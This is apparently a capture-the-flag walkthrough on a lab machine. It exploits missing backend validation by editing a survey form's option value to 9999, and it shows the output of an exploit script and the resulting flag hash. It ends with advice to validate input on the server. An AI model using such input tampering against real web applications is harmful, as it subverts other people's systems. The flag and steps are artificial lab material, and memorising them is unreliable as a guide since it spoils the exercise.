# Invalid input form validation

## Exploitation

On the navbar, there is a part named `survey`. We go to the page `http://192.168.1.48/?page=survey`

On this page, there is form to vote. We can choose a number between 1 and 10 for each person. Let's inspect the form

```html
<form action="#" method="post">
	<input type="hidden" name="sujet" value="2">
	<SELECT name="valeur" onChange='javascript:this.form.submit();'>
		<option value="1">1</option>
		<option value="2">2</option>
		<option value="3">3</option>
		<option value="4">4</option>
		<option value="5">5</option>
		<option value="6">6</option>
		<option value="7">7</option>
		<option value="8">8</option>
		<option value="9">9</option>
		<option value="10">10</option>
	</SELECT>
</form>
```

Let's try if we can change the value of one number

```html
<form action="#" method="post">
	<input type="hidden" name="sujet" value="2">
	<SELECT name="valeur" onChange='javascript:this.form.submit();'>
		<option value="1">1</option>
		<option value="2">2</option>
		<option value="3">3</option>
		<option value="4">4</option>
		<option value="5">5</option>
		<option value="6">6</option>
		<option value="7">7</option>
		<option value="8">8</option>
		<option value="9">9</option>
		<option value="9999">10</option>
	</SELECT>
</form>
```

With this, if there is no backend validation, we can change the number

Now choose the number 10 and send `9999`

We have the flag!

Script it!

The POST request is `sujet=2&valeur=10`

```
$ ./exploit.py 
 The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
```

## How to fix it?

Always do a verification of users inputs in backend before processing. Never trust users
